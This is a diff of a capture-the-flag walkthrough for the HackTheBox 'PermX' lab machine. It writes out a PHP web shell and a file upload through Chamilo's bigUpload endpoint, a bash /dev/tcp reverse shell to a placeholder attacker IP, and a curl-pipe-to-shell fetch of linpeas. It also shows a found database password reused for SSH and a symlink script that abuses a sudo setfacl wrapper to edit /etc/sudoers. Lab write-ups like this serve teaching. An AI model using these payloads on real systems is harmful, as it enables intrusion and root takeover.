@@ -153,7 +153,7 @@ With the proof of concept mentioned in the advisory, we can craft our payload.
 
 ## Web-shell
 
-```sh
+```bash
 $ echo '<?php system($_GET["cmd"]); ?>' > rce.php
 $ curl -F 'bigUploadFile=@rce.php' 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported'
 ```
@@ -168,25 +168,25 @@ THe web-shell one-liner can achieve RCE by visiting the website and manipulate t
 
 Open up `vim` or `nano` and paste your payload, because `echo` does not like this string.
 
-```sh
+```bash
 $ cat shell.php
 <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/<attacker-ip>/1234 0>&1'");?>
 $ curl -F 'bigUploadFile=@rce.php' 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported'
 ```
 
 Start netcat listener on another terminal
-```shell
+```bash
 you@local$ nc -lvnp 1234
 ```
 And visit the php file we just uploaded
 
-```shell
+```bash
 you@local$ curl http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/rce.php
 ```
 
 This will pop a shell on the terminal that's running netcat
 
-```
+```bash
 listening on [any] 1234 ...
 connect to [<attacker-ip>] from (UNKNOWN) [10.10.11.23] 41228
 bash: cannot set terminal process group (1169): Inappropriate ioctl for device
@@ -201,38 +201,125 @@ Then you can run `linpeas` on it
 ## Linpeas
 
 Obtaining `linpeas` from your local box by running `python3 -m http.server 5050` locally.
-```sh
+```bash
 $ python3 -m http.server 5050
 ```
 
 Running `linpeas` on the remote box.
-```sh
+```bash
 www-data@permx:/tmp/tmp.12345$ curl http://<attacker-ip>:5050/linpeas.sh | sh > linpeas.result
 ```
 
 Reading `linpeas` output file with color
-```sh
+```bash
 $ less -r linpeas.result
 ```
 
-After some digging, 
+After some digging, we found an interesting value that named `db_password`
+
+![linpeas](attachments\htb-permx\htb-permx-linpeas.png)
+
+```bash
+/var/www/chamilo/app/config/configuration.php:$_configuration['db_password'] = '03F6lY3uXAP2bkW8';
+```
+
+> Jokes on me to think that I cannot get anything from the web-facing .application
+
+## Local User
+
+Turns out the string is the password to the local user `mtz`
+
+```bash
+you@local$  ssh mtz@permx.htb
+```
 
 # Obtaining Root
 
 Check what command our user can execute with sudo privilege
-```sh
-mtz@permx$ sudo -l
+
+```bash
+mtz@permx:~$ sudo -l
+Matching Defaults entries for mtz on permx:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+    use_pty
+
+User mtz may run the following commands on permx:
+    (ALL : ALL) NOPASSWD: /opt/acl.sh
 ```
+This seems like a custom script, let's take a look at what it is
+
+```bash
+mtz@permx:~$ cat /opt/acl.sh
+#!/bin/bash
+
+if [ "$#" -ne 3 ]; then
+    /usr/bin/echo "Usage: $0 user perm file"
+    exit 1
+fi
+
+user="$1"
+perm="$2"
+target="$3"
+
+if [[ "$target" != /home/mtz/* || "$target" == *..* ]]; then
+    /usr/bin/echo "Access denied."
+    exit 1
+fi
+
+# Check if the path is a file
+if [ ! -f "$target" ]; then
+    /usr/bin/echo "Target must be a file."
+    exit 1
+fi
+
+/usr/bin/sudo /usr/bin/setfacl -m u:"$user":"$perm" "$target
+```
+
+- If the number of parameters attached in the command do not equal to 3, it prints `Usage: $0 user perm file`
+- Then it reads the parameters into variables.
+- It allows you to use any file in user home directory `/home/mtz/*`, and forbids any relative file link `*..*`
+- Then it check if it's a file
+- At last, it uses `setfacl`: set file access control list, and modifies the permission to the target file.
+
+## Exploit
+
+> Of course, we can do it by typing in commands manually. We can also write a script to streamline it efficiently.
+
+Because we can modify arbitrary file, we can give ourselves permission to execute `/bin/bash` as `root` by modifying the `/etc/sudoers` file. 
+
+```bash
+#!/bin/bash
+
+ln -s / /home/mtz/aster
+
+sudo /opt/acl.sh mtz rwx /home/mtz/aster/etc/sudoers
+
+echo "mtz    ALL=(root) /bin/bash" >> /etc/sudoers
+
+echo "[+] spawning shell..."
+
+sudo bash -i
+```
+
+- This script first creates a link in `/home/mtz` to the root directory `/` to escape the target file location check.
+- By using the `/opt/acl.sh` command as `root`, giving us read/write/execute permission to the `sudoers` file (by smuggling the file under the link, `/home/mtz/aster`, we created)
+- In the `sudoers` file, adding the permission to execute `/bin/bash` as `root` for user `mtz`
+- At last, execute `bash` as `root` interactively, it will prompt you to enter `mtz`'s password, after that, it will give you a `root` shell.
+
+![root](attachments/htb-permx/htb-permx-root.png)
+
+You should reset the machine after obtaining the root flag this way.
+
+# After Root
+
+My god the machine resets so frequently because of how the root flag is obtained and how easily someone can fuck up root files.
 
 > As silly as this is, you can get root shell by a simple `sudo /bin/bash -i` if you can execute `/bin/bash` with sudo (assuming root privilege).
 >
 > Just basic linux skill, a reminder to what the word hacker means: a person who's good at computer.
 > 
 > I'm a whacker.
-
-# After Root
-
-My god the machine resets so frequently because of how the root flag is obtained and how easily someone can fuck up root files.
 
 ## About linpeas and snooping around
 
